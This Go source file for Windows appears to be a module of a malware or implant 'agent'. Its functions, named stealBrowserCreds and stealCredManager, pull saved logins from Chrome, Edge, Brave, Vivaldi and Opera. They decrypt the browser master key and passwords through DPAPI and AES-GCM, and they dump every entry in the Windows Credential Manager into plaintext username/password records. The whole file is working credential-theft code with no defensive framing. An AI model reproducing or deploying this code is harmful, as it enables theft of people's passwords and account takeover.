//go:build windows

package agent

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"unsafe"

	_ "modernc.org/sqlite"
	"golang.org/x/sys/windows"
)

var (
	crypt32                = windows.NewLazySystemDLL("crypt32.dll")
	procCryptUnprotectData = crypt32.NewProc("CryptUnprotectData")
	advapi32               = windows.NewLazySystemDLL("advapi32.dll")
	procCredEnumerate      = advapi32.NewProc("CredEnumerateW")
	procCredFree           = advapi32.NewProc("CredFree")
)

type BrowserCred struct {
	Source   string `json:"source"`
	Target   string `json:"target"`
	Username string `json:"username"`
	Password string `json:"password"`
}

// dataBlob matches the Windows DATA_BLOB structure.
type dataBlob struct {
	cbData uint32
	pbData *byte
}

func dpUnprotect(enc []byte) ([]byte, error) {
	if len(enc) == 0 {
		return nil, fmt.Errorf("empty input")
	}
	in := dataBlob{cbData: uint32(len(enc)), pbData: &enc[0]}
	var out dataBlob
	r, _, err := procCryptUnprotectData.Call(
		uintptr(unsafe.Pointer(&in)),
		0, 0, 0, 0, 0,
		uintptr(unsafe.Pointer(&out)),
	)
	if r == 0 {
		return nil, err
	}
	result := make([]byte, out.cbData)
	if out.cbData > 0 {
		copy(result, unsafe.Slice(out.pbData, out.cbData))
	}
	windows.LocalFree(windows.Handle(unsafe.Pointer(out.pbData)))
	return result, nil
}

// chromiumBrowsers maps browser names to their AppData-relative paths.
var chromiumBrowsers = []struct {
	Name string
	Path string
}{
	{"Chrome", `Google\Chrome\User Data`},
	{"Edge", `Microsoft\Edge\User Data`},
	{"Brave", `BraveSoftware\Brave-Browser\User Data`},
	{"Vivaldi", `Vivaldi\User Data`},
	{"Opera", `Opera Software\Opera Stable`},
}

func stealBrowserCreds() ([]BrowserCred, error) {
	var all []BrowserCred

	localApp := os.Getenv("LOCALAPPDATA")
	if localApp == "" {
		// Fallback: construct from USERPROFILE or APPDATA (common when running as SYSTEM or service)
		if up := os.Getenv("USERPROFILE"); up != "" {
			localApp = filepath.Join(up, "AppData", "Local")
		} else if ad := os.Getenv("APPDATA"); ad != "" {
			localApp = filepath.Join(filepath.Dir(ad), "Local")
		}
	}

	if localApp != "" {
		for _, br := range chromiumBrowsers {
			baseDir := filepath.Join(localApp, br.Path)
			if _, err := os.Stat(baseDir); err != nil {
				continue
			}
			aesKey, err := chromiumMasterKey(baseDir)
			if err != nil {
				continue
			}
			profiles := chromiumProfiles(baseDir)
			for _, prof := range profiles {
				loginDB := filepath.Join(baseDir, prof, "Login Data")
				creds, err := readChromiumLogins(loginDB, aesKey, br.Name)
				if err == nil {
					all = append(all, creds...)
				}
			}
		}
	}

	// Windows Credential Manager — always try, no LOCALAPPDATA needed
	all = append(all, stealCredManager()...)

	return all, nil
}

func chromiumMasterKey(baseDir string) ([]byte, error) {
	lsPath := filepath.Join(baseDir, "Local State")
	raw, err := os.ReadFile(lsPath)
	if err != nil {
		return nil, err
	}
	var ls struct {
		OsCrypt struct {
			EncryptedKey string `json:"encrypted_key"`
		} `json:"os_crypt"`
	}
	if err := json.Unmarshal(raw, &ls); err != nil {
		return nil, err
	}
	decoded, err := base64.StdEncoding.DecodeString(ls.OsCrypt.EncryptedKey)
	if err != nil {
		return nil, err
	}
	// Prefix is literal "DPAPI" (5 bytes)
	if len(decoded) < 5 {
		return nil, fmt.Errorf("key too short")
	}
	return dpUnprotect(decoded[5:])
}

func chromiumProfiles(baseDir string) []string {
	profiles := []string{"Default"}
	entries, err := os.ReadDir(baseDir)
	if err != nil {
		return profiles
	}
	for _, e := range entries {
		if e.IsDir() && strings.HasPrefix(e.Name(), "Profile ") {
			profiles = append(profiles, e.Name())
		}
	}
	return profiles
}

func readChromiumLogins(dbPath string, aesKey []byte, browser string) ([]BrowserCred, error) {
	// Copy to temp — Chrome holds an exclusive lock on Login Data.
	tmp, err := os.CreateTemp("", "ld_*.db")
	if err != nil {
		return nil, err
	}
	tmpPath := tmp.Name()
	defer os.Remove(tmpPath)

	src, err := os.Open(dbPath)
	if err != nil {
		tmp.Close()
		return nil, err
	}
	_, cpErr := io.Copy(tmp, src)
	src.Close()
	tmp.Close()
	if cpErr != nil {
		return nil, cpErr
	}

	db, err := sql.Open("sqlite", tmpPath)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	rows, err := db.Query(`SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var creds []BrowserCred
	for rows.Next() {
		var url, user string
		var encPw []byte
		if err := rows.Scan(&url, &user, &encPw); err != nil {
			continue
		}
		pw := decryptChromiumPw(encPw, aesKey)
		if pw == "" {
			continue
		}
		creds = append(creds, BrowserCred{
			Source:   browser,
			Target:   url,
			Username: user,
			Password: pw,
		})
	}
	return creds, nil
}

func decryptChromiumPw(enc []byte, aesKey []byte) string {
	if len(enc) == 0 {
		return ""
	}
	// Chrome v80+ — AES-256-GCM, prefixed with "v10" or "v11"
	if len(enc) > 3 && (string(enc[:3]) == "v10" || string(enc[:3]) == "v11") {
		payload := enc[3:]
		if len(payload) < 12+16 {
			return ""
		}
		nonce, ct := payload[:12], payload[12:]
		block, err := aes.NewCipher(aesKey)
		if err != nil {
			return ""
		}
		gcm, err := cipher.NewGCM(block)
		if err != nil {
			return ""
		}
		plain, err := gcm.Open(nil, nonce, ct, nil)
		if err != nil {
			return ""
		}
		return string(plain)
	}
	// Legacy — bare DPAPI blob
	plain, err := dpUnprotect(enc)
	if err != nil {
		return ""
	}
	return string(plain)
}

// CREDENTIAL mirrors the Win32 CREDENTIALW structure.
type winCredential struct {
	Flags              uint32
	Type               uint32
	TargetName         *uint16
	Comment            *uint16
	LastWritten        windows.Filetime
	CredentialBlobSize uint32
	CredentialBlob     uintptr
	Persist            uint32
	AttributeCount     uint32
	Attributes         uintptr
	TargetAlias        *uint16
	UserName           *uint16
}

func stealCredManager() []BrowserCred {
	var count uint32
	var pCreds uintptr
	r, _, _ := procCredEnumerate.Call(0, 0, uintptr(unsafe.Pointer(&count)), uintptr(unsafe.Pointer(&pCreds)))
	if r == 0 || count == 0 {
		return nil
	}
	defer procCredFree.Call(pCreds)

	ptrs := unsafe.Slice((**winCredential)(unsafe.Pointer(pCreds)), count)

	var creds []BrowserCred
	for _, p := range ptrs {
		if p == nil || p.UserName == nil {
			continue
		}
		target := windows.UTF16PtrToString(p.TargetName)
		user := windows.UTF16PtrToString(p.UserName)

		var pw string
		if p.CredentialBlobSize > 0 && p.CredentialBlob != 0 {
			// Domain passwords are stored as UTF-16LE
			blob16 := unsafe.Slice((*uint16)(unsafe.Pointer(p.CredentialBlob)), p.CredentialBlobSize/2)
			pw = windows.UTF16ToString(blob16)
			// If UTF-16 decode produces garbage, fall back to raw bytes
			if !isPrintable(pw) {
				raw := unsafe.Slice((*byte)(unsafe.Pointer(p.CredentialBlob)), p.CredentialBlobSize)
				pw = string(raw)
			}
		}

		creds = append(creds, BrowserCred{
			Source:   "CredManager",
			Target:   target,
			Username: user,
			Password: pw,
		})
	}
	return creds
}

func isPrintable(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < 0x20 || r > 0x7E {
			return false
		}
	}
	return true
}
